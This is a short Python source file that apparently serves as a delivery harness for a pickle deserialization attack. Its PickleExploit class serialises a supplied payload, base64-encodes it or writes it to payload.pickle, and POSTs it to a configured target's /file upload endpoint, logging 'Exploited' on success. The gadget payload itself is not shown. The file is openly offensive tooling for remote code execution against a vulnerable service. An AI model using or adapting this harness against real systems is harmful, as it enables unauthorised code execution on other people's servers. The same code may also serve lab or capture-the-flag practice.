from config import settings
import pickle
import base64
import requests
import logging


class Logger:
    logging.basicConfig(level=logging.INFO)
    logger = logging.getLogger(__name__)


class PickleExploit(Logger):
    IP = settings.TARGET_IP
    PORT = settings.TARGET_PORT

    @classmethod
    def dump_with_encode(cls, payload):
        pickled = pickle.dumps(payload)
        return base64.urlsafe_b64encode(pickled)

    @classmethod
    def get_pickled_file(cls, payload):
        with open("payload.pickle", "wb") as file:
            pickle.dump(payload, file)

    @classmethod
    def run_exploit(cls, payload: bytes) -> None:
        url = f"http://{cls.IP}:{cls.PORT}/file"
        res = requests.post(url=url, files={"file": payload})
        result = "Exploited" if res.status_code == 200 else f"Error status code: {res.status_code}"
        logging.info(result)
